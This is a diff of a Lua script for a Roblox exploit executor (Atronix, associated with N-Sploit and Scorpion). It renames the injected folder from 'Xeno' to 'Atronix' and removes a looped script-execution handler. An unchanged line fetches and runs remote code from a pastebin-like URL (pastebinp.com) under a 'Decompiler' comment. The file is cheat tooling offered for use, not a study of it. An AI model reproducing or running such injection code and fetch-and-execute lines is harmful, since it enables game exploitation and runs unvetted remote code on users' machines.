@@ -3,7 +3,7 @@
 \\ Code is used by N-Sploit & Scorpion.
 ]]
 local AtronixContainer = Instance.new("Folder", RobloxReplicatedStorage)
-AtronixContainer.Name = "Xeno"
+AtronixContainer.Name = "Atronix"
 local objectPointerContainer, scriptsContainer = Instance.new("Folder", AtronixContainer), Instance.new("Folder", AtronixContainer)
 objectPointerContainer.Name = "Instance Pointers"
 scriptsContainer.Name = "Scripts"
@@ -787,26 +787,10 @@ end)
 check("setrbxclipboard", function()
     setrbxclipboard = setclipboard
 end)
-Xeno = Atronix
+
 
 loadstring(game:HttpGet("https://pastebinp.com/raw/592uK7Pe"))() -- Decompiler
 
 delay = task.delay
-
-task.spawn(function() -- execution handler
-	while task.wait(.06) do
-		local coreModule = workspace.Parent.Clone(coreModules[math.random(1, #coreModules)])
-		coreModule:ClearAllChildren()
-
-		coreModule.Name = HttpService:GenerateGUID(false)
-		coreModule.Parent = scriptsContainer
-
-		local thread = task.spawn(listen, coreModule)
-		delay(2.5, function()
-			coreModule:Destroy()
-			task.cancel(thread)
-		end)
-	end
-end)
 
 assert(true, warn("[ATORNIX-SCORPION]: Atronix loaded."))
